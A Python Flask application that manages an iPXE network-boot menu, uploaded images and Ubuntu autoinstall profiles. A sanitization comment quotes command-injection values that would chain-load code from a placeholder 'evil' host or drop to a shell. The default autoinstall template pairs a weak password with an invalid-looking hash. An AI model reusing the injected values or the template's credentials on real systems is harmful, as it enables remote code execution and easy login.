import os
import re
import json
import uuid
import fcntl
import pathlib
from contextlib import contextmanager
from urllib.parse import quote

try:
    import yaml  # for validating autoinstall user-data on save
except Exception:  # pragma: no cover - degrade gracefully if PyYAML is absent
    yaml = None

from flask import Flask, request, jsonify, render_template, Response
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 8 * 1024 * 1024 * 1024  # 8 GB

UPLOAD_DIR    = pathlib.Path(os.environ.get('UPLOAD_DIR',   '/data/uploads'))
ENTRIES_FILE  = pathlib.Path(os.environ.get('ENTRIES_FILE', '/data/state/entries.json'))
WEBFS_BASE    = os.environ.get('WEBFS_BASE', 'http://192.168.100.1:8080')
SERVER_IP     = os.environ.get('SERVER_IP',  '192.168.100.1')
AUTH_PASSWORD = os.environ.get('AUTH_PASSWORD', '')

# Autoinstall (cloud-init NoCloud) profiles: where they are stored and the base
# URL PXE clients use to fetch the seed. MANAGER_BASE must point at THIS service
# (default: the manager's own host:port) because it serves /autoinstall/<id>/.
AUTOINSTALL_FILE = pathlib.Path(
    os.environ.get('AUTOINSTALL_FILE', str(ENTRIES_FILE.parent / 'autoinstall.json')))
MANAGER_PORT = os.environ.get('MANAGER_PORT', '8091')
MANAGER_BASE = os.environ.get('MANAGER_BASE', f'http://{SERVER_IP}:{MANAGER_PORT}').rstrip('/')

# ── optional auth (everything except the PXE-facing menu endpoint) ──────────

@app.before_request
def _require_auth():
    # PXE clients fetch the menu and the autoinstall seed with no credentials,
    # so those stay open even when a password protects the manager UI/API.
    # (Management lives under /api/autoinstall, which is NOT exempted here.)
    if (not AUTH_PASSWORD or request.path == '/menu.ipxe'
            or request.path.startswith('/autoinstall/')):
        return None
    auth = request.authorization
    if auth and auth.password == AUTH_PASSWORD:
        return None
    return Response('Authentication required.', 401,
                    {'WWW-Authenticate': 'Basic realm="iPXE Manager"'})

# ── persistence ──────────────────────────────────────────────────────────────

def load_entries():
    if not ENTRIES_FILE.exists() or ENTRIES_FILE.stat().st_size == 0:
        return []
    try:
        return json.loads(ENTRIES_FILE.read_text())
    except Exception:
        # Corrupt JSON: preserve it instead of silently returning [] (a following
        # mutation would then persist the empty list and destroy the entries).
        try:
            ENTRIES_FILE.replace(ENTRIES_FILE.with_suffix('.json.corrupt'))
            app.logger.error('entries.json was invalid JSON; moved aside to %s',
                             ENTRIES_FILE.with_suffix('.json.corrupt'))
        except Exception:
            pass
        return []

def save_entries(entries):
    # ENTRIES_FILE lives on a directory bind mount, so tmp+rename is atomic
    # and visible on the host (renaming onto a single-file mount would EBUSY).
    # Unique temp name so two concurrent writers never share a tmp file.
    ENTRIES_FILE.parent.mkdir(parents=True, exist_ok=True)
    tmp = ENTRIES_FILE.with_name(f'.entries.{uuid.uuid4().hex}.tmp')
    tmp.write_text(json.dumps(entries, indent=2))
    tmp.replace(ENTRIES_FILE)


def load_profiles():
    if not AUTOINSTALL_FILE.exists() or AUTOINSTALL_FILE.stat().st_size == 0:
        return []
    try:
        return json.loads(AUTOINSTALL_FILE.read_text())
    except Exception:
        return []

def save_profiles(profiles):
    AUTOINSTALL_FILE.parent.mkdir(parents=True, exist_ok=True)
    tmp = AUTOINSTALL_FILE.with_name(f'.autoinstall.{uuid.uuid4().hex}.tmp')
    tmp.write_text(json.dumps(profiles, indent=2))
    tmp.replace(AUTOINSTALL_FILE)


@contextmanager
def entries_lock():
    # Serializes read-modify-write across gunicorn's 2 processes x 8 threads;
    # a threading.Lock would only cover one process. fcntl is fine on Linux.
    ENTRIES_FILE.parent.mkdir(parents=True, exist_ok=True)
    lockfile = ENTRIES_FILE.with_name('.entries.lock')
    with open(lockfile, 'w') as lf:
        fcntl.flock(lf, fcntl.LOCK_EX)
        try:
            yield
        finally:
            fcntl.flock(lf, fcntl.LOCK_UN)

# ── input sanitization ───────────────────────────────────────────────────────

_CTRL = re.compile(r'[\x00-\x1f\x7f]')
# iPXE splits a line into separate commands on these tokens, so a value like
# "quiet || chain http://evil/x.ipxe" on the kernel line, or "Ubuntu && shell"
# on an item line, would execute injected commands during menu construction.
_IPXE_SEP = re.compile(r'\|\||&&|;')

def _clean(value, maxlen=200):
    v = _CTRL.sub(' ', str(value))
    v = _IPXE_SEP.sub(' ', v)
    return v.strip()[:maxlen]

def sanitize_fields(data):
    """Whitelist, clean and validate entry fields. Returns (fields, error)."""
    out = {}
    if 'name' in data:
        name = _clean(data['name'])
        if not name:
            return None, 'name must not be empty'
        out['name'] = name
    if 'type' in data:
        if data['type'] not in ('kernel', 'iso', 'chain'):
            return None, 'type must be kernel, iso or chain'
        out['type'] = data['type']
    if 'enabled' in data:
        out['enabled'] = bool(data['enabled'])
    for k in ('kernel', 'initrd', 'iso'):
        if k in data:
            fn = secure_filename(str(data[k])) if data[k] else ''
            if data[k] and not fn:
                return None, f'invalid {k} filename'
            out[k] = fn
    if 'cmdline' in data:
        out['cmdline'] = _clean(data['cmdline'], 500)
    if 'url' in data:
        url = _clean(data['url'], 500)
        if url and not re.fullmatch(r'https?://\S+', url):
            return None, 'url must be http(s):// with no spaces'
        out['url'] = url
    if 'autoinstall' in data:
        # reference to an autoinstall profile id (validated against the store at
        # menu-generation time); the seed string itself is built server-side so
        # the required ';' in ds=nocloud-net;s=... never passes through _clean
        ai = str(data['autoinstall'] or '')
        if ai and not re.fullmatch(r'[A-Za-z0-9]{1,40}', ai):
            return None, 'invalid autoinstall profile id'
        out['autoinstall'] = ai
    return out, None

# ── file helpers ─────────────────────────────────────────────────────────────

def file_url(name):
    return f'{WEBFS_BASE}/files/{quote(name)}'

def list_files():
    result = []
    if UPLOAD_DIR.exists():
        for f in sorted(UPLOAD_DIR.iterdir()):
            # dotfiles include .<name>.uploading partials — never show them
            if f.is_file() and not f.name.startswith('.'):
                result.append({
                    'name': f.name,
                    'size': f.stat().st_size,
                    'url':  file_url(f.name),
                })
    return result

# ── iPXE menu generator ───────────────────────────────────────────────────────

def entry_body_lines(e):
    """The iPXE commands that boot a single entry (no label, no trailing goto).
    Kernel+initrd over HTTP is the UEFI-friendly path; sanboot is BIOS-only."""
    t = e.get('type', 'kernel')
    lines = []
    if t == 'kernel':
        kernel  = e.get('kernel', '')
        initrd  = e.get('initrd', '')
        cmdline = e.get('cmdline', '')
        # args go on the kernel line so no imgargs name-matching is needed.
        # modern kernels locate the initrd via an 'initrd=<name>' argument on
        # the command line (not just the iPXE 'initrd' fetch), so add it — the
        # basename matches how iPXE registers the downloaded file.
        args = []
        if initrd:
            args.append(f'initrd={pathlib.Path(initrd).name}')
        if cmdline:
            args.append(cmdline)
        # Attach an autoinstall (cloud-init NoCloud) seed when the entry points
        # at a profile. Built here (not via user input) so the ';' survives.
        ai = e.get('autoinstall')
        if ai:
            args.append(f'autoinstall ds=nocloud-net;s={MANAGER_BASE}/autoinstall/{ai}/')
        arg_str = (' ' + ' '.join(args)) if args else ''
        # every fetch needs '|| goto failed' — iPXE aborts the whole script
        # on the first unhandled command failure (e.g. a deleted file 404s)
        lines.append(f'kernel {file_url(kernel)}{arg_str} || goto failed')
        if initrd:
            lines.append(f'initrd {file_url(initrd)} || goto failed')
        lines.append('boot || goto failed')
    elif t == 'iso':
        # --no-describe matches the static boot-iso.ipxe and avoids a describe
        # step some BIOS sanboot paths choke on
        lines.append(f'sanboot --no-describe {file_url(e.get("iso", ""))} || goto failed')
    elif t == 'chain':
        lines.append(f'chain {e.get("url", "")} || goto failed')
    return lines

def generate_menu(entries):
    enabled = [e for e in entries if e.get('enabled', True)]
    default = enabled[0]['id'] if enabled else 'shell'

    lines = [
        '#!ipxe',
        ':start',
        'menu Lab PXE Boot Menu',
        'item --gap -- ---- Boot Options ----',
    ]
    for e in enabled:
        # flag unattended installs in the visible menu — they wipe the target disk
        label = e['name'] + ('  [AUTOINSTALL — ERASES DISK]' if e.get('autoinstall') else '')
        lines.append(f"item {e['id']:<12} {label}")
    lines += [
        'item --gap --',
        'item shell        iPXE Shell',
        'item exit         Exit to BIOS/UEFI',
        f'choose --default {default} --timeout 30000 target && goto ${{target}} || goto exit',
    ]

    for e in enabled:
        lines.append(f'\n:{e["id"]}')
        lines += entry_body_lines(e)
        # a returned/failed boot must not fall through into the next section
        lines.append('goto start')

    lines += [
        '\n:failed',
        'echo Boot failed — returning to menu in 5 seconds',
        'sleep 5',
        'goto start',
        '\n:shell',
        "echo Type 'exit' to return to the menu",
        'shell',
        'goto start',
        '\n:exit',
        'exit',
    ]
    return '\n'.join(lines) + '\n'

# ── routes ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template('index.html', webfs_base=WEBFS_BASE, server_ip=SERVER_IP)

@app.route('/menu.ipxe')
def menu_ipxe():
    return Response(generate_menu(load_entries()), mimetype='text/plain')

@app.route('/api/preview', methods=['GET'])
def api_preview():
    return Response(generate_menu(load_entries()), mimetype='text/plain')

@app.route('/api/config', methods=['GET'])
def api_config():
    # lets the UI show the fixed base URL as a locked prefix so the operator
    # only ever edits the filename, never the path
    return jsonify({'webfs_base': WEBFS_BASE, 'files_base': f'{WEBFS_BASE}/files/',
                    'server_ip': SERVER_IP})

@app.route('/api/preview_entry', methods=['POST'])
def api_preview_entry():
    # authoritative single-entry preview: same sanitize + generator the real
    # menu uses, so the editor shows exactly what a client will receive
    fields, err = sanitize_fields(request.get_json(force=True) or {})
    if err:
        return jsonify({'error': err, 'lines': []}), 200
    entry = {'id': 'e' + ('0' * 7), 'type': 'kernel', 'enabled': True}
    entry.update(fields)
    return jsonify({'lines': entry_body_lines(entry), 'error': None})

# files

@app.route('/api/files', methods=['GET'])
def api_files():
    return jsonify(list_files())

@app.route('/api/files', methods=['POST'])
def api_upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    f = request.files['file']
    filename = secure_filename(f.filename or '')
    if not filename:
        return jsonify({'error': 'Invalid filename'}), 400
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
    dest = UPLOAD_DIR / filename
    # stream to a hidden, unique temp name so webfs never serves a half-written
    # file and two concurrent uploads of the same name can't corrupt each other
    tmp = UPLOAD_DIR / f'.{filename}.{uuid.uuid4().hex}.uploading'
    try:
        f.save(str(tmp))
        tmp.replace(dest)
    except Exception as exc:
        tmp.unlink(missing_ok=True)
        return jsonify({'error': f'Upload failed: {exc}'}), 500

    # An ISO maps cleanly to a single sanboot entry, so auto-create one
    # (disabled, so it never changes the boot menu until you enable it).
    # Kernels can't be auto-added — they need a matching initrd and cmdline.
    auto_entry = None
    if filename.lower().endswith('.iso'):
        with entries_lock():
            entries = load_entries()
            if not any(e.get('type') == 'iso' and e.get('iso') == filename
                       for e in entries):
                auto_entry = {'id': 'e' + uuid.uuid4().hex[:7],
                              'name': pathlib.Path(filename).stem,
                              'type': 'iso', 'iso': filename, 'enabled': False}
                entries.append(auto_entry)
                save_entries(entries)

    return jsonify({'name': filename, 'size': dest.stat().st_size,
                    'url': file_url(filename), 'auto_entry': auto_entry}), 201

@app.route('/api/files/<filename>', methods=['DELETE'])
def api_delete_file(filename):
    path = UPLOAD_DIR / secure_filename(filename)
    if path.exists() and path.is_file():
        path.unlink()
        return jsonify({'ok': True})
    return jsonify({'error': 'Not found'}), 404

# boot entries

@app.route('/api/entries', methods=['GET'])
def api_get_entries():
    return jsonify(load_entries())

@app.route('/api/entries', methods=['POST'])
def api_add_entry():
    fields, err = sanitize_fields(request.get_json(force=True) or {})
    if err:
        return jsonify({'error': err}), 400
    if not fields.get('name'):
        return jsonify({'error': 'name is required'}), 400
    # ids double as iPXE goto labels; leading letter keeps them unambiguous
    entry = {'id': 'e' + uuid.uuid4().hex[:7], 'type': 'kernel', 'enabled': True}
    entry.update(fields)
    with entries_lock():
        entries = load_entries()
        entries.append(entry)
        save_entries(entries)
    return jsonify(entry), 201

@app.route('/api/entries/<eid>', methods=['PUT'])
def api_update_entry(eid):
    fields, err = sanitize_fields(request.get_json(force=True) or {})
    if err:
        return jsonify({'error': err}), 400
    with entries_lock():
        entries = load_entries()
        for i, e in enumerate(entries):
            if e['id'] == eid:
                entries[i] = {**e, **fields, 'id': eid}
                save_entries(entries)
                return jsonify(entries[i])
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/entries/<eid>', methods=['DELETE'])
def api_delete_entry(eid):
    with entries_lock():
        save_entries([e for e in load_entries() if e['id'] != eid])
    return jsonify({'ok': True})

# ── autoinstall (cloud-init NoCloud) profiles ─────────────────────────────────

DEFAULT_AUTOINSTALL = """\
#cloud-config
# ─────────────────────────────────────────────────────────────────────────────
# Ubuntu Server autoinstall (subiquity). Served to the installer over HTTP as a
# cloud-init NoCloud seed. ⚠️  THIS PERFORMS AN UNATTENDED INSTALL AND WILL ERASE
# THE TARGET DISK. Review every value before enabling the boot entry.
#
# Pair with a "Kernel + initrd" boot entry whose command line points at the
# matching live-server ISO, e.g.:
#   ip=dhcp url=http://SERVER:8080/files/ubuntu-24.04.1-live-server-amd64.iso
# then attach this profile to that entry (the seed URL is added automatically).
# ─────────────────────────────────────────────────────────────────────────────
autoinstall:
  version: 1
  locale: en_US.UTF-8
  keyboard:
    layout: us
  identity:
    hostname: ubuntu-lab
    username: ubuntu
    # Password is 'ubuntu' — CHANGE THIS. Generate with:  mkpasswd -m sha-512
    password: "$6$rounds=4096$aReallyBadSalt$Vp8m0Xb3W4o8gk0m1kQ2sT0p9c5r7uY0"
  ssh:
    install-server: true
    allow-pw: true
  storage:
    layout:
      name: direct        # use the whole disk; wipes existing data
  packages:
    - openssh-server
  user-data:
    disable_root: true
  late-commands: []
"""


def _validate_user_data(text):
    """Return an error string if the user-data is unusable, else None."""
    if not text.strip():
        return 'user-data must not be empty'
    if yaml is not None:
        body = text
        if body.lstrip().startswith('#cloud-config'):
            body = body.split('\n', 1)[1] if '\n' in body else ''
        try:
            doc = yaml.safe_load(body) if body.strip() else None
        except yaml.YAMLError as exc:
            return f'user-data is not valid YAML: {exc}'
        if doc is not None and not isinstance(doc, dict):
            return 'user-data must be a YAML mapping (e.g. an autoinstall: block)'
    return None


@app.route('/api/autoinstall', methods=['GET'])
def api_list_profiles():
    profiles = load_profiles()
    listed = [{'id': p['id'], 'name': p.get('name', ''),
               'hostname': p.get('hostname', ''),
               'seed_url': f'{MANAGER_BASE}/autoinstall/{p["id"]}/'}
              for p in profiles]
    return jsonify({'profiles': listed, 'template': DEFAULT_AUTOINSTALL,
                    'manager_base': MANAGER_BASE})


@app.route('/api/autoinstall/<pid>', methods=['GET'])
def api_get_profile(pid):
    for p in load_profiles():
        if p['id'] == pid:
            return jsonify({**p, 'seed_url': f'{MANAGER_BASE}/autoinstall/{pid}/'})
    return jsonify({'error': 'Not found'}), 404


@app.route('/api/autoinstall', methods=['POST'])
def api_save_profile():
    data = request.get_json(force=True) or {}
    name = _clean(data.get('name', ''))
    if not name:
        return jsonify({'error': 'name is required'}), 400
    user_data = str(data.get('user_data', ''))
    err = _validate_user_data(user_data)
    if err:
        return jsonify({'error': err}), 400
    hostname = _clean(data.get('hostname', '') or '', 63)
    pid = data.get('id') or ''
    with entries_lock():
        profiles = load_profiles()
        if pid:
            found = next((p for p in profiles if p['id'] == pid), None)
            if not found:
                return jsonify({'error': 'Not found'}), 404
            found.update({'name': name, 'hostname': hostname, 'user_data': user_data})
        else:
            pid = 'a' + uuid.uuid4().hex[:7]
            profiles.append({'id': pid, 'name': name, 'hostname': hostname,
                             'user_data': user_data})
        save_profiles(profiles)
    return jsonify({'id': pid, 'seed_url': f'{MANAGER_BASE}/autoinstall/{pid}/'}), 201


@app.route('/api/autoinstall/<pid>', methods=['DELETE'])
def api_delete_profile(pid):
    with entries_lock():
        save_profiles([p for p in load_profiles() if p['id'] != pid])
    return jsonify({'ok': True})


def _profile_or_404(pid):
    for p in load_profiles():
        if p['id'] == pid:
            return p
    return None


# PXE-facing seed endpoints (no auth — the installer has no credentials).
@app.route('/autoinstall/<pid>/user-data')
def serve_user_data(pid):
    p = _profile_or_404(pid)
    if not p:
        return Response('# unknown autoinstall profile\n', 404, mimetype='text/plain')
    return Response(p.get('user_data', ''), mimetype='text/plain')


@app.route('/autoinstall/<pid>/meta-data')
def serve_meta_data(pid):
    p = _profile_or_404(pid)
    if not p:
        return Response('', 404, mimetype='text/plain')
    hostname = p.get('hostname') or 'ubuntu-lab'
    return Response(f'instance-id: iid-{pid}\nlocal-hostname: {hostname}\n',
                    mimetype='text/plain')


@app.route('/autoinstall/<pid>/vendor-data')
def serve_vendor_data(pid):
    # cloud-init requests vendor-data; an empty 200 keeps it quiet
    return Response('', mimetype='text/plain')


@app.errorhandler(413)
def _entry_too_large(_e):
    limit = app.config['MAX_CONTENT_LENGTH'] // (1024 * 1024 * 1024)
    return jsonify({'error': f'file exceeds the {limit} GB upload limit'}), 413


@app.route('/api/entries/reorder', methods=['POST'])
def api_reorder():
    order = (request.get_json(force=True) or {}).get('order', [])
    with entries_lock():
        entries = load_entries()
        by_id = {e['id']: e for e in entries}
        reordered = [by_id[eid] for eid in order if eid in by_id]
        # entries the client didn't know about (added concurrently) must survive
        listed = set(order)
        reordered += [e for e in entries if e['id'] not in listed]
        save_entries(reordered)
    return jsonify({'ok': True})

if __name__ == '__main__':
    # Dev/local convenience only — the container runs gunicorn as its CMD.
    # gthread: heartbeat stays in the main thread, so multi-GB uploads in
    # worker threads are not killed by the arbiter timeout (sync workers are).
    os.execvp('gunicorn', [
        'gunicorn', '-w', '2', '-k', 'gthread', '--threads', '8',
        '--timeout', '120', '-b', '0.0.0.0:8091', 'app:app',
    ])
